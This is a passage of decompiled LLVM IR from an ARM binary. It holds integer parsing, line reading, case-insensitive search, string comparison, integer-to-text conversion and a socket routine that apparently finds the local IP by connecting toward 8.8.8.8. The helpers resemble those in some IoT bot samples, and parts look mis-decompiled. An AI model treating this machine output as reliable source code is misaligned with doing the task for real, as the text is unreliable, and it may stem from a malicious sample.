  br i1 %v7_11b34, label %dec_label_pc_11c14, label %dec_label_pc_11b3c

dec_label_pc_11b3c:                               ; preds = %dec_label_pc_11b34
  %v7_11b3c = icmp eq i8 %v2_11b14, 43
  br i1 %v7_11b3c, label %bb54, label %dec_label_pc_11b4c

bb54:                                             ; preds = %dec_label_pc_11b3c
  %v2_11b40 = inttoptr i32 %v5_11b14 to i8*
  %v3_11b40 = load i8, i8* %v2_11b40, align 1
  %v6_11b40 = add i32 %v0_11b14, 2
  br label %dec_label_pc_11b4c

dec_label_pc_11b4c:                               ; preds = %bb54, %dec_label_pc_11b3c, %dec_label_pc_11c14
  %v0_11bf842 = phi i32 [ %v5_11c14, %dec_label_pc_11c14 ], [ %v5_11b14, %dec_label_pc_11b3c ], [ %v6_11b40, %bb54 ]
  %v0_11b7417.in = phi i8 [ %v2_11c14, %dec_label_pc_11c14 ], [ %v2_11b14, %dec_label_pc_11b3c ], [ %v3_11b40, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_11c14 ], [ 2147483647, %dec_label_pc_11b3c ], [ 2147483647, %bb54 ]
  %v0_11c24 = phi i32 [ 1, %dec_label_pc_11c14 ], [ 0, %dec_label_pc_11b3c ], [ 0, %bb54 ]
  %v2_11b54 = urem i32 %storemerge1, %arg2
  %v2_11b64 = udiv i32 %storemerge1, %arg2
  store i32 %v2_11b64, i32* @lr, align 4
  br label %dec_label_pc_11b74

dec_label_pc_11b74:                               ; preds = %.thread8, %dec_label_pc_11b4c
  %v0_11bf8 = phi i32 [ %v5_11bf8, %.thread8 ], [ %v0_11bf842, %dec_label_pc_11b4c ]
  %v2_11bf011 = phi i32 [ %v1_11c0c29, %.thread8 ], [ 0, %dec_label_pc_11b4c ]
  %v1_11bcc = phi i32 [ %v0_11c0027, %.thread8 ], [ 0, %dec_label_pc_11b4c ]
  %v1_11bb4.in = phi i8 [ %v2_11bf8, %.thread8 ], [ %v0_11b7417.in, %dec_label_pc_11b4c ]
  %v1_11bb4 = zext i8 %v1_11bb4.in to i32
  %v1_11b74 = urem i32 %v1_11bb4, 256
  %v1_11b78 = add nsw i32 %v1_11b74, -48
  %v1_11b80 = add nsw i32 %v1_11b74, -97
  %v1_11b84 = add nsw i32 %v1_11bb4, -48
  %v1_11b88 = add nsw i32 %v1_11b74, -65
  %tmp77 = icmp ult i32 %v1_11b78, 10
  br i1 %tmp77, label %dec_label_pc_11bb8, label %dec_label_pc_11b90

dec_label_pc_11b90:                               ; preds = %dec_label_pc_11b74
  %v2_11b90 = icmp ugt i32 %v1_11b88, 24
  %v7_11b90 = icmp eq i32 %v1_11b88, 25
  %v2_11b94 = xor i1 %v7_11b90, true
  %v3_11b94 = and i1 %v2_11b90, %v2_11b94
  br i1 %v3_11b94, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_11b90
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_11b90, %bb55
  %v0_11ba821 = phi i32 [ %v1_11b84, %dec_label_pc_11b90 ], [ 0, %bb55 ]
  %v2_11b98 = xor i1 %v2_11b90, true
  %v3_11b98 = or i1 %v7_11b90, %v2_11b98
  br i1 %v3_11b98, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_11ba8 = phi i32 [ %v0_11ba821, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_11b94, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_11ba0 = icmp ugt i32 %v1_11b80, 24
  %v11_11ba0 = icmp eq i32 %v1_11b80, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_11ba4 = phi i1 [ %v7_11b90, %bb58 ], [ %v11_11ba0, %bb59 ]
  %v0_11ba4 = phi i1 [ %v2_11b90, %bb58 ], [ %v6_11ba0, %bb59 ]
  %v2_11ba4 = xor i1 %v1_11ba4, true
  %v3_11ba4 = and i1 %v0_11ba4, %v2_11ba4
  br i1 %v3_11ba4, label %dec_label_pc_11c00, label %dec_label_pc_11ba8

dec_label_pc_11ba8:                               ; preds = %bb60
  %v2_11ba8 = icmp eq i32 %v0_11ba8, 0
  %. = select i1 %v2_11ba8, i32 87, i32 55
  %v2_11bb4 = sub nsw i32 %v1_11bb4, %.
  br label %dec_label_pc_11bb8

dec_label_pc_11bb8:                               ; preds = %dec_label_pc_11b74, %dec_label_pc_11ba8
  %v0_11bcc37 = phi i32 [ %v1_11b88, %dec_label_pc_11b74 ], [ %., %dec_label_pc_11ba8 ]
  %v3_11bf012 = phi i32 [ %v1_11b84, %dec_label_pc_11b74 ], [ %v2_11bb4, %dec_label_pc_11ba8 ]
  %v6_11bbc = icmp slt i32 %v3_11bf012, %arg2
  br i1 %v6_11bbc, label %dec_label_pc_11bc0, label %dec_label_pc_11c00

dec_label_pc_11bc0:                               ; preds = %dec_label_pc_11bb8
  %v3_11bc0 = icmp uge i32 %v2_11bf011, %v2_11b64
  %v9_11bc0 = icmp eq i32 %v2_11bf011, %v2_11b64
  %v2_11bc4 = xor i1 %v3_11bc0, true
  %v3_11bc4 = or i1 %v9_11bc0, %v2_11bc4
  br i1 %v3_11bc4, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_11bc0
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_11bc0, %bb63
  %v0_11bcc36 = phi i32 [ %v0_11bcc37, %dec_label_pc_11bc0 ], [ 0, %bb63 ]
  %v2_11bc8 = xor i1 %v9_11bc0, true
  %v3_11bc8 = and i1 %v3_11bc0, %v2_11bc8
  br i1 %v3_11bc8, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_11bcc = phi i32 [ %v0_11bcc36, %bb64 ], [ 1, %bb65 ]
  %tmp78 = icmp slt i32 %v1_11bcc, 0
  %v4_11bcc = zext i1 %tmp78 to i32
  %v5_11bcc = or i32 %v0_11bcc, %v4_11bcc
  %v7_11bcc = icmp eq i32 %v5_11bcc, 0
  br i1 %v7_11bcc, label %dec_label_pc_11bd8, label %.thread8

dec_label_pc_11bd8:                               ; preds = %bb66
  %v7_11be8 = icmp sgt i32 %v3_11bf012, %v2_11b54
  br i1 %v7_11be8, label %bb69, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_11bd8
  br label %bb70

bb69:                                             ; preds = %dec_label_pc_11bd8
  %v2_11bec = icmp eq i1 %v9_11bc0, false
  br i1 %v2_11bec, label %bb70, label %.thread8

bb70:                                             ; preds = %bb69, %.thread5
  %v4_11bf013 = mul i32 %v2_11bf011, %arg2
  %v5_11bf014 = add i32 %v3_11bf012, %v4_11bf013
  br label %.thread8

.thread8:                                         ; preds = %bb69, %bb66, %bb70
  %v1_11c0c29 = phi i32 [ %v2_11bf011, %bb69 ], [ %v2_11bf011, %bb66 ], [ %v5_11bf014, %bb70 ]
  %v0_11c0027 = phi i32 [ -1, %bb69 ], [ -1, %bb66 ], [ 1, %bb70 ]
  %v1_11bf8 = inttoptr i32 %v0_11bf8 to i8*
  %v2_11bf8 = load i8, i8* %v1_11bf8, align 1
  %v5_11bf8 = add i32 %v0_11bf8, 1
  br label %dec_label_pc_11b74

dec_label_pc_11c00:                               ; preds = %dec_label_pc_11bb8, %bb60
  %v1_11c00 = icmp slt i32 %v1_11bcc, 0
  %v2_11c24 = icmp eq i32 %v0_11c24, 0
  br i1 %v1_11c00, label %dec_label_pc_11c24, label %dec_label_pc_11c08

dec_label_pc_11c08:                               ; preds = %dec_label_pc_11c00
  br i1 %v2_11c24, label %bb72, label %bb71

bb71:                                             ; preds = %dec_label_pc_11c08
  %v2_11c0c = sub i32 0, %v2_11bf011
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_11c08, %bb71
  %v23_11c10 = phi i32 [ %v2_11bf011, %dec_label_pc_11c08 ], [ %v2_11c0c, %bb71 ]
  ret i32 %v23_11c10

dec_label_pc_11c14:                               ; preds = %dec_label_pc_11b34
  %v1_11c14 = inttoptr i32 %v5_11b14 to i8*
  %v2_11c14 = load i8, i8* %v1_11c14, align 1
  %v5_11c14 = add i32 %v0_11b14, 2
  br label %dec_label_pc_11b4c

dec_label_pc_11c24:                               ; preds = %dec_label_pc_11c00
  %.76 = select i1 %v2_11c24, i32 2147483647, i32 -2147483648
  ret i32 %.76

; uselistorder directives
  uselistorder i1 %v9_11bc0, { 1, 0, 2 }
  uselistorder i1 %v3_11bc0, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_11b90, { 1, 2, 0 }
  uselistorder i1 %v2_11b90, { 1, 0, 2 }
  uselistorder i32 %v1_11b74, { 1, 2, 0 }
  uselistorder i32 %v1_11bb4, { 1, 0, 2 }
  uselistorder i32 %v1_11bcc, { 1, 0 }
  uselistorder i32 %v2_11bf011, { 0, 1, 6, 3, 2, 4, 5 }
  uselistorder i32 %v0_11bf8, { 1, 0 }
  uselistorder i32 %v2_11b64, { 1, 0, 2 }
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder i32 %v5_11b14, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_11b14, { 0, 1, 3, 2 }
  uselistorder i32 25, { 20, 21, 9, 10, 2, 11, 3, 12, 4, 13, 14, 15, 0, 16, 5, 17, 1, 18, 6, 7, 19, 8, 22 }
  uselistorder i32 24, { 33, 34, 12, 11, 62, 41, 63, 42, 43, 50, 54, 35, 36, 37, 38, 39, 40, 57, 44, 45, 46, 47, 48, 49, 51, 52, 58, 53, 59, 55, 56, 64, 65, 66, 60, 61, 67, 0, 70, 13, 71, 14, 72, 15, 73, 16, 1, 74, 17, 18, 2, 75, 19, 76, 20, 3, 21, 22, 4, 23, 5, 24, 6, 7, 25, 8, 77, 26, 9, 78, 27, 79, 80, 81, 28, 29, 10, 82, 30, 83, 31, 68, 32, 69 }
  uselistorder i8 32, { 7, 8, 9, 0, 10, 11, 12, 1, 2, 3, 4, 5, 6 }
  uselistorder i8 9, { 3, 4, 2, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_11bb8, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_11b4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11b14, { 1, 2, 0, 3 }
}

define i32 @function_11c34(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11c34:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_11c34 = load i32, i32* @r4, align 4
  store i32 %v3_11c34, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11c4c

dec_label_pc_11c4c:                               ; preds = %dec_label_pc_11c78.dec_label_pc_11c4c_crit_edge, %dec_label_pc_11c34
  %v0_11c50 = phi i32 [ %v0_11c50.pre, %dec_label_pc_11c78.dec_label_pc_11c4c_crit_edge ], [ %arg3, %dec_label_pc_11c34 ]
  %v0_11c4c = phi i32 [ %v1_11c64, %dec_label_pc_11c78.dec_label_pc_11c4c_crit_edge ], [ %tmp, %dec_label_pc_11c34 ]
  %v3_11c58 = inttoptr i32 %v0_11c4c to i32*
  %v4_11c58 = call i32 @read(i32 %v0_11c50, i32* %v3_11c58, i32 1)
  %v7_11c5c = icmp eq i32 %v4_11c58, 1
  %v0_11c60 = load i32, i32* %r4.global-to-local, align 4
  %v1_11c64 = add i32 %v0_11c60, 1
  store i32 %v1_11c64, i32* %r4.global-to-local, align 4
  %v0_11c6c = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_11c5c, label %dec_label_pc_11c6c, label %dec_label_pc_11c84

dec_label_pc_11c6c:                               ; preds = %dec_label_pc_11c4c
  %v1_11c6c = add i32 %v0_11c6c, 1
  store i32 %v1_11c6c, i32* %r5.global-to-local, align 4
  %v0_11c70 = load i32, i32* %r7.global-to-local, align 4
  %v7_11c74 = icmp sgt i32 %v0_11c70, %v1_11c6c
  br i1 %v7_11c74, label %dec_label_pc_11c78, label %dec_label_pc_11c84

dec_label_pc_11c78:                               ; preds = %dec_label_pc_11c6c
  %v1_11c78 = inttoptr i32 %v0_11c60 to i8*
  %v2_11c78 = load i8, i8* %v1_11c78, align 1
  %v7_11c7c = icmp eq i8 %v2_11c78, 10
  br i1 %v7_11c7c, label %dec_label_pc_11c84, label %dec_label_pc_11c78.dec_label_pc_11c4c_crit_edge

dec_label_pc_11c78.dec_label_pc_11c4c_crit_edge:  ; preds = %dec_label_pc_11c78
  %v0_11c50.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11c4c

dec_label_pc_11c84:                               ; preds = %dec_label_pc_11c4c, %dec_label_pc_11c78, %dec_label_pc_11c6c
  %v0_11c84 = phi i32 [ %v1_11c6c, %dec_label_pc_11c78 ], [ %v1_11c6c, %dec_label_pc_11c6c ], [ %v0_11c6c, %dec_label_pc_11c4c ]
  %v2_11c84 = icmp eq i32 %v0_11c84, 0
  %v1_11c88 = load i32, i32* %r8.global-to-local, align 4
  %storemerge = select i1 %v2_11c84, i32 0, i32 %v1_11c88
  %v2_11c90 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11c90, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_11c64, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i8 10, { 1, 0, 2 }
  uselistorder i32 (i32, i32*, i32)* @read, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_11c84, { 1, 2, 0 }
}

define i32 @function_11c94() local_unnamed_addr {
dec_label_pc_11c94:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  store i32 16, i32* %stack_var_-24, align 4
  %v0_11ca4 = call i32* @__errno_location()
  store i32 0, i32* %v0_11ca4, align 4
  %v3_11cbc = call i32 @socket(i32 2, i32 0, i32 0)
  %v7_11cc8 = icmp eq i32 %v3_11cbc, -1
  store i32 %v3_11cbc, i32* %r5.global-to-local, align 4
  %v2_11cd4 = load i32, i32* %r4.global-to-local, align 4
  br i1 %v7_11cc8, label %dec_label_pc_11d24, label %dec_label_pc_11ce8

dec_label_pc_11ce8:                               ; preds = %dec_label_pc_11c94
  %v7_11cd4 = shl i32 2056, %v2_11cd4
  %v8_11cd4 = or i32 %v7_11cd4, 2056
  %v2_11c9c = ptrtoint i32* %stack_var_-40 to i32
  %v1_11cd8 = inttoptr i32 %v2_11cd4 to %sockaddr*
  store i32 2, i32* %stack_var_-40, align 4
  %v6_11d04 = call i32 @connect(i32 %v2_11c9c, %sockaddr* %v1_11cd8, i32 %v2_11cd4)
  %tmp13 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v0_11d10 = load i32, i32* %r5.global-to-local, align 4
  %v6_11d14 = call i32 @getsockname(i32 %v0_11d10, %sockaddr* %tmp13, i32* nonnull %stack_var_-24)
  %v1_11d1c = call i32 @close(i32 %v0_11d10)
  br label %dec_label_pc_11d24

dec_label_pc_11d24:                               ; preds = %dec_label_pc_11c94, %dec_label_pc_11ce8
  %v0_11d24 = phi i32 [ 0, %dec_label_pc_11c94 ], [ %v8_11cd4, %dec_label_pc_11ce8 ]
  ret i32 %v0_11d24

; uselistorder directives
  uselistorder i32 %v2_11cd4, { 1, 0, 2 }
  uselistorder i32 %v3_11cbc, { 1, 0 }
  uselistorder i32 (i32)* @close, { 18, 1, 2, 6, 0, 3, 5, 4, 19, 24, 23, 17, 16, 15, 33, 32, 31, 30, 11, 10, 9, 8, 7, 22, 21, 20, 29, 28, 27, 26, 25, 14, 13, 12, 34 }
  uselistorder i32 (i32, %sockaddr*, i32)* @connect, { 5, 3, 4, 8, 7, 6, 1, 0, 2, 9 }
  uselistorder i32 2056, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 7, 18, 17, 19, 22, 21, 20, 24, 23, 3, 2, 5, 4, 16, 15, 6, 9, 0, 8, 11, 1, 10, 14, 13, 12, 25 }
  uselistorder i32* ()* @__errno_location, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_11d24, { 1, 0 }
}

define i32 @function_11d30(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11d30:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp20 = ptrtoint i8* %arg1 to i32
  %v3_11d34 = load i8, i8* %tmp, align 1
  %v2_11d38 = icmp eq i8 %v3_11d34, 0
  br i1 %v2_11d38, label %bb, label %dec_label_pc_11d4c

bb:                                               ; preds = %dec_label_pc_11d30
  %v4_11d34 = zext i8 %v3_11d34 to i32
  br label %dec_label_pc_11d60

dec_label_pc_11d4c:                               ; preds = %dec_label_pc_11d30
  br label %dec_label_pc_11d50

dec_label_pc_11d50:                               ; preds = %dec_label_pc_11d50, %dec_label_pc_11d4c
  %v0_11d50 = phi i32 [ %v1_11d50, %dec_label_pc_11d50 ], [ 0, %dec_label_pc_11d4c ]
  %v1_11d50 = add i32 %v0_11d50, 1
  %v2_11d54 = add i32 %v1_11d50, %arg2
  %v3_11d54 = inttoptr i32 %v2_11d54 to i8*
  %v4_11d54 = load i8, i8* %v3_11d54, align 1
  %v2_11d58 = icmp eq i8 %v4_11d54, 0
  br i1 %v2_11d58, label %dec_label_pc_11d60, label %dec_label_pc_11d50

dec_label_pc_11d60:                               ; preds = %dec_label_pc_11d50, %bb
  %v0_11da418 = phi i32 [ %v4_11d34, %bb ], [ %v1_11d50, %dec_label_pc_11d50 ]
  %v0_11d681 = load i32, i32* @r1, align 4
  %tmp27 = icmp slt i32 %v0_11d681, 1
  br i1 %tmp27, label %dec_label_pc_11db4, label %dec_label_pc_11d74

dec_label_pc_11d74:                               ; preds = %dec_label_pc_11d60, %dec_label_pc_11d68.backedge
  %v0_11d6c.in = phi i32 [ %v0_11d6c, %dec_label_pc_11d68.backedge ], [ %v0_11d681, %dec_label_pc_11d60 ]
  %v0_11d98 = phi i32 [ %v1_11d98., %dec_label_pc_11d68.backedge ], [ 0, %dec_label_pc_11d60 ]
  %v0_11d74 = phi i32 [ %v5_11d74, %dec_label_pc_11d68.backedge ], [ %tmp20, %dec_label_pc_11d60 ]
  %v0_11d6c = add i32 %v0_11d6c.in, -1
  %v1_11d74 = inttoptr i32 %v0_11d74 to i8*
  %v2_11d74 = load i8, i8* %v1_11d74, align 1
  %v3_11d74 = zext i8 %v2_11d74 to i32
  %v5_11d74 = add i32 %v0_11d74, 1
  %v2_11d78 = add i32 %v0_11d98, %arg2
  %v3_11d78 = inttoptr i32 %v2_11d78 to i8*
  %v4_11d78 = load i8, i8* %v3_11d78, align 1
  %v6_11d78 = zext i8 %v4_11d78 to i32
  %v1_11d7c = add nsw i32 %v3_11d74, -65
  %v1_11d80 = add nsw i32 %v6_11d78, -65
  %tmp35 = icmp ult i32 %v1_11d7c, 26
  br i1 %tmp35, label %bb28, label %bb29

bb28:                                             ; preds = %dec_label_pc_11d74
  %v5_11d88 = or i32 %v3_11d74, 96
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_11d74, %bb28
  %v0_11d94 = phi i32 [ %v3_11d74, %dec_label_pc_11d74 ], [ %v5_11d88, %bb28 ]
  %tmp36 = icmp ult i32 %v1_11d80, 26
  br i1 %tmp36, label %bb30, label %bb31

bb30:                                             ; preds = %bb29
  %v5_11d90 = or i32 %v6_11d78, 96
  br label %bb31

bb31:                                             ; preds = %bb29, %bb30
  %v1_11d94 = phi i32 [ %v6_11d78, %bb29 ], [ %v5_11d90, %bb30 ]
  %v9_11d94 = icmp eq i32 %v0_11d94, %v1_11d94
  %v1_11d98 = add i32 %v0_11d98, 1
  %v1_11d98. = select i1 %v9_11d94, i32 %v1_11d98, i32 0
  br i1 %v9_11d94, label %dec_label_pc_11da4, label %dec_label_pc_11d68.backedge

dec_label_pc_11d68.backedge:                      ; preds = %bb31, %dec_label_pc_11da4
  %tmp32 = icmp slt i32 %v0_11d6c, 1
  br i1 %tmp32, label %dec_label_pc_11db4, label %dec_label_pc_11d74

dec_label_pc_11da4:                               ; preds = %bb31
  %v9_11da4 = icmp eq i32 %v0_11da418, %v1_11d98.
  br i1 %v9_11da4, label %dec_label_pc_11dac, label %dec_label_pc_11d68.backedge

dec_label_pc_11dac:                               ; preds = %dec_label_pc_11da4
  %v2_11dac = sub i32 %v5_11d74, %tmp20
  ret i32 %v2_11dac

dec_label_pc_11db4:                               ; preds = %dec_label_pc_11d68.backedge, %dec_label_pc_11d60
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_11d98., { 1, 0 }
  uselistorder i32 %v0_11d74, { 1, 0 }
  uselistorder i32 %v0_11d98, { 1, 0 }
  uselistorder i8 %v3_11d34, { 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i32 26, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* @r1, { 3, 13, 0, 14, 19, 20, 5, 4, 42, 6, 7, 8, 9, 10, 11, 12, 15, 16, 17, 1, 18, 43, 44, 2, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 46 }
  uselistorder label %dec_label_pc_11d68.backedge, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_11d74, { 1, 0 }
}

define i32 @function_11dbc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11dbc:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_11dbc = load i8, i8* %arg1, align 1
  %v2_11dc0 = icmp eq i8 %v2_11dbc, 0
  br i1 %v2_11dc0, label %bb, label %dec_label_pc_11dcc

bb:                                               ; preds = %dec_label_pc_11dbc
  %v3_11dbc = zext i8 %v2_11dbc to i32
  br label %dec_label_pc_11de0

dec_label_pc_11dcc:                               ; preds = %dec_label_pc_11dbc
  br label %dec_label_pc_11dd0

dec_label_pc_11dd0:                               ; preds = %dec_label_pc_11dd0, %dec_label_pc_11dcc
  %v0_11dd0 = phi i32 [ %v1_11dd0, %dec_label_pc_11dd0 ], [ 0, %dec_label_pc_11dcc ]
  %v1_11dd0 = add i32 %v0_11dd0, 1
  %v2_11dd4 = add i32 %v1_11dd0, %tmp
  %v3_11dd4 = inttoptr i32 %v2_11dd4 to i8*
  %v4_11dd4 = load i8, i8* %v3_11dd4, align 1
  %v2_11dd8 = icmp eq i8 %v4_11dd4, 0
  br i1 %v2_11dd8, label %dec_label_pc_11de0, label %dec_label_pc_11dd0

dec_label_pc_11de0:                               ; preds = %dec_label_pc_11dd0, %bb
  %v0_11e04 = phi i32 [ %v3_11dbc, %bb ], [ %v1_11dd0, %dec_label_pc_11dd0 ]
  %v1_11de0 = inttoptr i32 %arg2 to i8*
  %v2_11de0 = load i8, i8* %v1_11de0, align 1
  %v2_11de4 = icmp eq i8 %v2_11de0, 0
  br i1 %v2_11de4, label %bb22, label %dec_label_pc_11df0

bb22:                                             ; preds = %dec_label_pc_11de0
  %v3_11de0 = zext i8 %v2_11de0 to i32
  br label %dec_label_pc_11e04

dec_label_pc_11df0:                               ; preds = %dec_label_pc_11de0
  br label %dec_label_pc_11df4

dec_label_pc_11df4:                               ; preds = %dec_label_pc_11df4, %dec_label_pc_11df0
  %v0_11df4 = phi i32 [ %v1_11df4, %dec_label_pc_11df4 ], [ 0, %dec_label_pc_11df0 ]
  %v1_11df4 = add i32 %v0_11df4, 1
  %v2_11df8 = add i32 %v1_11df4, %arg2
  %v3_11df8 = inttoptr i32 %v2_11df8 to i8*
  %v4_11df8 = load i8, i8* %v3_11df8, align 1
  %v2_11dfc = icmp eq i8 %v4_11df8, 0
  br i1 %v2_11dfc, label %dec_label_pc_11e04, label %dec_label_pc_11df4

dec_label_pc_11e04:                               ; preds = %dec_label_pc_11df4, %bb22
  %v0_11e304 = phi i32 [ %v3_11de0, %bb22 ], [ %v1_11df4, %dec_label_pc_11df4 ]
  %v9_11e04 = icmp eq i32 %v0_11e04, %v0_11e304
  br i1 %v9_11e04, label %dec_label_pc_11e30.preheader, label %dec_label_pc_11e10

dec_label_pc_11e30.preheader:                     ; preds = %dec_label_pc_11e04
  %v2_11e306 = icmp eq i32 %v0_11e04, 0
  br i1 %v2_11e306, label %dec_label_pc_11e38, label %dec_label_pc_11e18

dec_label_pc_11e10:                               ; preds = %dec_label_pc_11e18, %dec_label_pc_11e04
  ret i32 0

dec_label_pc_11e18:                               ; preds = %dec_label_pc_11e28, %dec_label_pc_11e30.preheader
  %v0_11e30.in = phi i32 [ %v0_11e30, %dec_label_pc_11e28 ], [ %v0_11e04, %dec_label_pc_11e30.preheader ]
  %v0_11e2c = phi i32 [ %v1_11e2c, %dec_label_pc_11e28 ], [ %arg2, %dec_label_pc_11e30.preheader ]
  %v0_11e28 = phi i32 [ %v1_11e28, %dec_label_pc_11e28 ], [ %tmp, %dec_label_pc_11e30.preheader ]
  %v0_11e30 = add i32 %v0_11e30.in, -1
  %v1_11e18 = inttoptr i32 %v0_11e28 to i8*
  %v2_11e18 = load i8, i8* %v1_11e18, align 1
  %v1_11e1c = inttoptr i32 %v0_11e2c to i8*
  %v2_11e1c = load i8, i8* %v1_11e1c, align 1
  %v9_11e20 = icmp eq i8 %v2_11e18, %v2_11e1c
  br i1 %v9_11e20, label %dec_label_pc_11e28, label %dec_label_pc_11e10

dec_label_pc_11e28:                               ; preds = %dec_label_pc_11e18
  %v1_11e28 = add i32 %v0_11e28, 1
  %v1_11e2c = add i32 %v0_11e2c, 1
  %v2_11e30 = icmp eq i32 %v0_11e30, 0
  br i1 %v2_11e30, label %dec_label_pc_11e38, label %dec_label_pc_11e18

dec_label_pc_11e38:                               ; preds = %dec_label_pc_11e28, %dec_label_pc_11e30.preheader
  ret i32 1

; uselistorder directives
  uselistorder i8 %v2_11de0, { 1, 0 }
  uselistorder i8 %v2_11dbc, { 1, 0 }
}

define i32 @function_11e40(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11e40:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-62 = alloca i32, align 4
  %stack_var_-30 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_11e40 = load i32, i32* @r4, align 4
  store i32 %v3_11e40, i32* %stack_var_-28, align 4
  %v22_11e40 = ptrtoint i32* %stack_var_-28 to i32
  %v0_11e44 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_11e44, i32* %r8.global-to-local, align 4
  %v2_11e44 = icmp eq i32 %v0_11e44, 0
  store i1 %v2_11e44, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_11e44, label %dec_label_pc_11f34, label %dec_label_pc_11e54

dec_label_pc_11e54:                               ; preds = %dec_label_pc_11e40
  %v3_11e54 = icmp eq i8 %arg1, 0
  store i1 %v3_11e54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11e54, label %.thread, label %dec_label_pc_11e68

.thread:                                          ; preds = %dec_label_pc_11e54
  %v4_11e5c = inttoptr i32 %v0_11e44 to i8*
  store i8 48, i8* %v4_11e5c, align 1
  %v0_11e60.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e60.pr.pr, label %.thread1, label %dec_label_pc_11e68

.thread1:                                         ; preds = %.thread
  %v4_11e60 = load i32, i32* %r8.global-to-local, align 4
  %v5_11e60 = add i32 %v4_11e60, 1
  %v6_11e60 = inttoptr i32 %v5_11e60 to i8*
  store i8 0, i8* %v6_11e60, align 1
  %v0_11e64.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e64.pr.pr, label %dec_label_pc_11f34, label %dec_label_pc_11e68

dec_label_pc_11e68:                               ; preds = %dec_label_pc_11e54, %.thread, %.thread1
  %tmp40 = icmp slt i8 %arg1, 0
  %v7_11e6c = icmp eq i32 %arg2, 10
  store i1 %v7_11e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11e6c, label %bb, label %.thread22

.thread22:                                        ; preds = %dec_label_pc_11e68
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_11e68
  %v4_11e68 = zext i1 %tmp40 to i32
